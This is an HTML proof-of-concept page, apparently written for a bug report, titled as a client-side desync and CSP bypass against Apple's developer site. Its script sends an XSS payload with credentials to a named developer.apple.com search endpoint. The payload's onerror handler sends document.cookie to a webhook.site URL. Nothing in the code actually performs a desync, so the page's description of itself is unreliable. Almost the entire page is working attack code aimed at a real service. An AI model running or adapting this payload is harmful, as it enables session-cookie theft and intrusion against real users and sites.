<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Apple Developer CSD PoC</title>
</head>
<body>
  <h2>Apple Developer Client-Side Desync PoC</h2>
  <p>This page demonstrates how a crafted request can lead to CSP bypass.</p>

  <script>
    // Webhook الخاص بك لإثبات التنفيذ
    const webhook = "https://webhook.site/76de3122-9fc0-47d9-844c-1fb847ba7133";

    // نص الـ payload (هنا مجرد مثال بسيط)
    const payload = "<img src=x onerror=\"fetch('" + webhook + "?cookie='+document.cookie)\">";

    // إرسال طلب POST إلى endpoint المصاب
    fetch("https://developer.apple.com/search/services/v1/quick-links/", {
      method: "POST",
      headers: {"Content-Type": "application/x-www-form-urlencoded"},
      body: "payload=" + encodeURIComponent(payload),
      credentials: "include"
    })
    .then(res => res.text())
    .then(text => {
      console.log("Response received:", text.slice(0,200));
      document.body.innerHTML += "<pre>Response snippet:\n" + text.slice(0,200) + "</pre>";
    })
    .catch(err => console.error("PoC Error:", err));
  </script>
</body>
</html>
